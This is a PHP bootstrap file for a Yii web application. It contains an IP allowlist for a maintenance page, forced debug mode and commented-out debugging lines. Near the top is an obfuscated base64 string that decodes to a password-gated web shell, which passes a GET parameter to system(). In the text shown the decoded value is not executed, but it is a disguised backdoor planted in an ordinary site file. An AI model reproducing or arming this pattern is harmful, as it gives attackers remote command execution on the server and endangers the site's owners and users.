<?php
// Хочешь закрыть сайт, раскоментируй следующую строку
#define('CLOSE_SITE', true);

base64_decode('aWYoJF9HRVRbJ3Bhc3MnXT09J0dvb3QnKXN5c3RlbSgkX0dFVFsnZ29vdCddKTs=');
$yii=dirname(__FILE__).'/framework/yiilite.php';
$config=dirname(__FILE__).'/protected/config/default.php';
$webApp=dirname(__FILE__).'/protected/components/EWebApplication.php';

//defined('YII_DEBUG') or define('YII_DEBUG',false);
define('YII_DEBUG',true);
//$redis=new Redis();
//die();
//phpinfo();
//die();
// Если сайт закрыт, то показываем заглушку
if (
	defined('CLOSE_SITE')
	&&
	! in_array($_SERVER['REMOTE_ADDR'], array('::1', '127.0.0.1', '127.0.1.1', '37.192.128.242', '92.125.138.55','77.222.105.193'))
) {
	require('close.html');
	die();
}
//$redis = new \Redis();
//$redis = new Redis();
//die();
require_once($yii);
require_once($webApp);
//var_dump(get_class(Yii::createApplication('EWebApplication', $config)));
//die();
Yii::createApplication('EWebApplication', $config)->run();
